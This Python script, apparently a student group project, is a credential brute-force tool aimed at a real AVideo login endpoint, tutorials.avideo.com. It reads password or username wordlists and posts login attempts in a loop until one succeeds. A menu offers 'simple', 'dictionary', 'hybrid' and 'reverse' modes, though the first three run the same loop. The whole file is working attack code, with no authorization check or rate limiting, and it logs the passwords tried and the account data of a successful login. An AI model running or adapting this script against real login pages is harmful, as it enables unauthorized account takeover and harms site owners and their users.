## Bruteforce Attack For Avideo Website
## GroupName     Date           Members
## Group-7       2/24/2024      KyawLinNaing, SaiKaungThantPhyo, SuYeeHnin, WinLaeLaePhyo, ThazinNyein

import os.path
import requests
import logging
import logging.config
import sys
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style


logging.basicConfig(filename='app.log', filemode='w', format='%(asctime)s \n\t%(levelname)s - %(message)s', datefmt='%d-%b-%y %H:%M:%S')

colorama_init()

# Declare colors
class bcolors:
    HEADER      = '\033[95m'
    OKBLUE      = '\033[94m'
    OKCYAN      = '\033[96m'
    OKGREEN     = '\033[92m'
    WARNING     = '\033[93m'
    FAIL        = '\033[91m'
    ENDC        = '\033[0m'
    BOLD        = '\033[1m'
    UNDERLINE   = '\033[4m'

# Check python version
if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall python3 and try: python 
    bruteforceattack.py\n\t--------------------------------------''')
    logging.error('install python3 and try: python bruteforceattack.py')
    sys.exit()

PASSWORD_FILE = ""                                                  # Password File
MIN_PASSWORD_LENGTH = 6                                             # Password length
POST_URL = "https://tutorials.avideo.com/objects/login.json.php"    # Target website url link
PAYLOAD = {}                                                        # Form data(username,password)

def get_password_and_attack(PASSWORD_FILE):
    # Check passwords file is exit or not
    if not os.path.isfile(PASSWORD_FILE):
        print(bcolors.FAIL + "\t[ - ] Password file [", PASSWORD_FILE ,"] is not exist!" + bcolors.ENDC)
        logging.error('Password file ['+ PASSWORD_FILE+ '] is not exist!')
        sys.exit(0)
    
    # Open and read data from password list
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print(bcolors.OKBLUE + "\tPassword file selected: ", PASSWORD_FILE)

    # Request input for target username
    username = input('\tEnter Username to target: ').strip()
    bcolors.ENDC
    # Loop for password in password lists
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()

        # Check Passwore length is valiad or invaliad
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print(bcolors.OKBLUE + '\n\t============================================================================================')
        print("\t[", index, "] Trying password with : ", password + bcolors.ENDC)
        logging.critical('['+ str(index)+ '] Trying password with :'+ password)

        # Check for password is correct or not
        if is_this_a_password(username, password):
            break

def get_usernnme_and_attack(USERNAME_FILE):
    # Check username file is exit or not
    if not os.path.isfile(USERNAME_FILE):
        print(bcolors.FAIL + "\t[ - ] Username file [", USERNAME_FILE ,"] is not exist! " + bcolors.ENDC)
        logging.error('Username file ['+ USERNAME_FILE+ '] is not exist!')
        sys.exit(0)
    
    # Open and read data from username list
    username_data = open(USERNAME_FILE, 'r').read().split("\n")
    print(bcolors.OKBLUE + "\tUsername file selected: ", USERNAME_FILE)

    # Request input for target password
    password = input('\tEnter Password for target account: ').strip()
    bcolors.ENDC
    # Loop for username in username lists
    for index, username in zip(range(username_data.__len__()), username_data):
        username = username.strip()
        print(bcolors.OKBLUE + '\n\t============================================================================================')
        print("\t[", index, "] Trying username with : ", username + bcolors.ENDC)

        # Check for username is correct or not
        if is_this_a_username(username, password):
            break

# Function for Simple Brute Force Attack
def simple_brute_force_attack(PASSWORD_FILE):
    get_password_and_attack(PASSWORD_FILE)
    
# Function for Dictionary Attack
def dictionary_attack(PASSWORD_FILE):
    get_password_and_attack(PASSWORD_FILE)

# Function for Simple Brute Force Attack
def hybrid_brute_force_attack(PASSWORD_FILE):
    get_password_and_attack(PASSWORD_FILE)

# Function for Simple Brute Force Attack
def reverse_brute_force_attack(PASSWORD_FILE):
    get_usernnme_and_attack(PASSWORD_FILE)

# function for check username and password is correct or not
def is_this_a_password(username, password):
    global PAYLOAD
    PAYLOAD['user'] = username                                      # Target username
    PAYLOAD['pass'] = password                                      # Target password
    
    response            = requests.post(POST_URL, data=PAYLOAD)     # Response data for login data success or not
    response_json       = response.json()                           # Change json data
    id                  = response_json["id"]                       # Get user id
    nameIdentification  = response_json["nameIdentification"]       # Get user nameIdentification
    #print(response_json)
    # Check id and is nameIdentification exit or not
    if id != False and nameIdentification.lower() != 'unknown user':
        print(bcolors.OKGREEN + '\t[ + ] Your attack password is correct!: ', password + bcolors.ENDC )
        print(bcolors.OKBLUE + '\t============================================================================================' + bcolors.ENDC)
        logging.critical(response_json)
        return True
    print(bcolors.FAIL + '\t[ - ] Your attack password is incorrect!: ', password + bcolors.ENDC)
    print(bcolors.OKBLUE + '\t============================================================================================' + bcolors.ENDC)
    return False

# function for check username and password is correct or not
def is_this_a_username(username, password):
    global PAYLOAD
    PAYLOAD['user'] = username                                      # Target username
    PAYLOAD['pass'] = password                                      # Target password
    
    response            = requests.post(POST_URL, data=PAYLOAD)     # Response data for login data success or not
    response_json       = response.json()                           # Change json data
    id                  = response_json["id"]                       # Get user id
    nameIdentification  = response_json["nameIdentification"]       # Get user nameIdentification
    #print(response_json)
    # Check id and is nameIdentification exit or not
    if id != False and nameIdentification.lower() != 'unknown user':
        print(bcolors.OKGREEN + '\t[ + ] Your attack username is correct!: ', username + bcolors.ENDC )
        print(bcolors.OKBLUE + '\t============================================================================================' + bcolors.ENDC)
        return True
    print(bcolors.FAIL + '\t[ - ] Your attack username is incorrect!: ', username + bcolors.ENDC)
    print(bcolors.OKBLUE + '\t============================================================================================' + bcolors.ENDC)
    return False

#Main Function for bruteforce attack
if __name__ == "__main__":

    # Title for bruteforce attack
    print("\n")
    print(bcolors.OKCYAN +
            "\tBBBBBB   RRRRRR   UU   UU  TTTTTTTT  EEEEEEE  FFFFFFF   OOOOO    RRRRRR   CCCCCCC   EEEEEEE" 
          +"\n\tBB  BBB  RR  RRR  UU   UU  TT TT TT  EE       FF       OO   OO   RR  RRR  CC   CC   EE"
          +"\n\tBB  BBB  RR  RRR  UU   UU     TT     EE       FF       OO   OO   RR  RRR  CC        EE"
          +"\n\tBBBBBB   RRRRRR   UU   UU     TT     EEEEEEE  FFFFFFF  OO   OO   RRRRRR   CC        EEEEEEE"
          +"\n\tBB  BBB  RR RR    UU   UU     TT     EE       FF       OO   OO   RR RR    CC        EE"
          +"\n\tBB  BBB  RR  RR   UU   UU     TT     EE       FF       OO   OO   RR  RR   CC   CC   EE"
          +"\n\tBBBBBB   RR   RR   UUUUU      TT     EEEEEEE  FF        OOOOO    RR   RR  CCCCCCC   EEEEEEE"
          
          + bcolors.ENDC)
    print(bcolors.OKGREEN + '\n\n\tPlease select attack method : ')
    print('\t                            |-------')
    print('\t                            | Please enter [ 1 ] for Simple Brute Force Attack')
    print('\t                            |-------')
    print('\t                            | Please enter [ 2 ] for Dictionary Attack')
    print('\t                            |-------')
    print('\t                            | Please enter [ 3 ] for Hybrid Brute Force Attack')
    print('\t                            |-------')
    print('\t                            | Please enter [ 4 ] for Reverse Brute Force Attack')
    print('\t                            |-------')
    print('\t                            | Please enter [ 0 ] for exit from  Attack')
    print('\t                            |-------')

    # Request input for target username
    method = input('\tEnter Attack Method: ').strip()
    
    # If input is '0', exit from attack
    if method == '0':
        print(bcolors.WARNING +'\n\tExit From Brute Force Attack!\n' + bcolors.ENDC)
        sys.exit(0)
    
    # If input is '1',attack with simple brute force attack
    elif method =='1':
        PASSWORD_FILE = "simple_brute_force_passwords.txt"  
        print(bcolors.HEADER + '\n\t============================================================================================'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t------------------------------- Welcome To Simple Brute Force Attack------------------------'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t============================================================================================\n'+ bcolors.ENDC)
        simple_brute_force_attack(PASSWORD_FILE)
    
    # If input is '2',attack with Dictionary Attack
    elif method =='2':
        PASSWORD_FILE = "dictionary_passwords.txt"  
        print(bcolors.HEADER + '\n\t============================================================================================'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t------------------------------- Welcome To Dictionary Attack--------------------------------'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t============================================================================================\n'+ bcolors.ENDC)
        dictionary_attack(PASSWORD_FILE)
    
    # If input is '3',attack with Hybrid Brute Force Attack
    elif method =='3':
        PASSWORD_FILE = "hybrid_brute_force_passwords.txt"  
        print(bcolors.HEADER + '\n\t============================================================================================'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t------------------------------- Welcome To Hybrid Brute Force Attack------------------------'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t============================================================================================\n'+ bcolors.ENDC)
        hybrid_brute_force_attack(PASSWORD_FILE)
    
    # If input is '4',attack with Reverse Brute Force Attack
    elif method =='4':
        USERNAME_FILE = "reverse_brute_force_usernames.txt"  
        print(bcolors.HEADER + '\n\t============================================================================================'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t------------------------------ Welcome To Reverse Brute Force Attack------------------------'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t============================================================================================\n'+ bcolors.ENDC)
        reverse_brute_force_attack(USERNAME_FILE)
    
    else:
        print(bcolors.FAIL +'\n\t[ - ] Sorry your input method is invaliad!\n' + bcolors.ENDC)
        sys.exit(0)